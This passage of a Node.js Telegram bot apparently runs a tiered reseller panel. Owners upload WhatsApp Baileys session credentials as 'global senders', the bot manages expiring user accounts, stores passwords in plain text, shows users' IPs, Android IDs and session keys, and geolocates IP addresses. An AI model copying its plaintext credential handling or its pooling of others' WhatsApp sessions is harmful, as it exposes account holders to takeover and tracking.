  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      // 🛡️ FIX: dulu pakai variabel TOKEN yang tidak pernah didefinisikan -> upload file via Telegram selalu error
      const fileUrl = `https://api.telegram.org/file/bot${BOTCFG_TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // 🌐 Mode upload sender global (owner/admin, via /addglobal)
      if (pendingGlobalUpload.has(msg.from.id)) {
        pendingGlobalUpload.delete(msg.from.id);

        // Ambil nomor asli dari isi creds (me.user.id) sebagai nama session
        let num = String(jsonData?.me?.user?.id || '').replace(/\D/g, '');
        if (!num) num = `global-${Date.now()}`;

        if (!fs.existsSync(GLOBAL_SENDER_DIR)) fs.mkdirSync(GLOBAL_SENDER_DIR, { recursive: true });

        fs.writeFileSync(path.join(GLOBAL_SENDER_DIR, `${num}.json`), JSON.stringify(jsonData));

        // Folder session + creds.json agar langsung bisa connect
        const sessDir = path.join(GLOBAL_SENDER_DIR, num);
        if (!fs.existsSync(sessDir)) fs.mkdirSync(sessDir, { recursive: true });
        fs.writeFileSync(path.join(sessDir, 'creds.json'), JSON.stringify(jsonData));

        bot.sendMessage(chatId, `✅ Sender global ${maskNumber(num)} disimpan, menyambungkan...`);

        // Langsung connect tanpa perlu restart server
        try {
          if (!activeConnections[num]) await connectGlobalSenders();
          bot.sendMessage(chatId,
            activeConnections[num]
              ? `🌐 Sender global ${maskNumber(num)} ✅ online.`
              : `⚠️ Sender global ${maskNumber(num)} disimpan tapi belum terhubung. Coba /refresh`);
        } catch (err) {
          bot.sendMessage(chatId, `⚠️ Gagal connect sender global: ${err.message}`);
        }
        return;
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

// 🌐 ===== SENDER GLOBAL: upload & kelola via Telegram (owner only) =====
const BOTCFG_TOKEN = (() => {
  try { return JSON.parse(fs.readFileSync(path.join(__dirname, 'botconfig.json'), 'utf8')).token || ''; }
  catch (_) { return ''; }
})();
const pendingGlobalUpload = new Set(); // userId yang sedang mode upload sender global

bot.onText(/^\/?(addglobal|addglobalsender)\b/, async (msg) => {
  // 🌐 Owner (OWNER_ID) atau admin (daftar ownerList di telegram.json) boleh kelola
  const config = loadTelegramConfig();
  const isGlobalAdmin = msg.from.id === OWNER_ID || config.ownerList.includes(msg.from.id);
  if (!isGlobalAdmin) {
    return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }
  pendingGlobalUpload.add(msg.from.id);
  bot.sendMessage(msg.chat.id,
    "🌐 *Sender Global*\nKirim file `creds.json` (Baileys) di chat ini untuk ditambahkan sebagai sender global.\nKetik `/cancelglobal` untuk batal.",
    { parse_mode: "Markdown" });
});

bot.onText(/^\/?(cancelglobal)\b/, async (msg) => {
  pendingGlobalUpload.delete(msg.from.id);
  bot.sendMessage(msg.chat.id, "❌ Upload sender global dibatalkan.");
});

bot.onText(/^\/?(global)\b/i, async (msg) => {
  const config = loadTelegramConfig();
  const isGlobalAdmin = msg.from.id === OWNER_ID || config.ownerList.includes(msg.from.id);
  if (!isGlobalAdmin) {
    return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }
  const names = getGlobalSenderFolder();
  if (!names.length) return bot.sendMessage(msg.chat.id, "🌐 Belum ada sender global.\nKirim `/addglobal` lalu upload creds.json.");

  const list = names.map((n, i) =>
    `${i + 1}. ${maskNumber(n)} ${activeConnections[n] ? "✅" : "❌"}`
  ).join("\n");
  bot.sendMessage(msg.chat.id,
    `🌐 *Sender Global (${names.length})*\n${list}\n\n✅ = online | ❌ = offline\nHapus: /delglobal <nomor lengkap>`,
    { parse_mode: "Markdown" });
});

bot.onText(/^\/?(delglobal)\s+(.+)/, async (msg, match) => {
  const config = loadTelegramConfig();
  const isGlobalAdmin = msg.from.id === OWNER_ID || config.ownerList.includes(msg.from.id);
  if (!isGlobalAdmin) {
    return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }
  const num = match[2].replace(/\D/g, "");
  const credsFile = path.join(GLOBAL_SENDER_DIR, `${num}.json`);
  if (!fs.existsSync(credsFile)) {
    return bot.sendMessage(msg.chat.id, "❌ Sender global tidak ditemukan.");
  }

  // Putuskan koneksi & hapus folder session + creds
  if (activeConnections[num]) {
    try { activeConnections[num].ws.close(); } catch (_) {}
    delete activeConnections[num]; delete biz[num]; delete mess[num];
  }
  try { fs.rmSync(path.join(GLOBAL_SENDER_DIR, num), { recursive: true, force: true }); } catch (_) {}
  fs.rmSync(credsFile, { force: true });

  bot.sendMessage(msg.chat.id, `🗑️ Sender global ${maskNumber(num)} dihapus.`);
});

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${maskNumber(num)}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${maskNumber(num)}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${maskNumber(num)}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*MikuHost Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;
    const globalOnline = getGlobalSenderFolder().filter(n => activeConnections[n]).length;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}
• Sender Global Online: ${globalOnline}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder permenmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
    startUserSessions()
});

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(`🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// Kirim notifikasi sebelum restart
setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);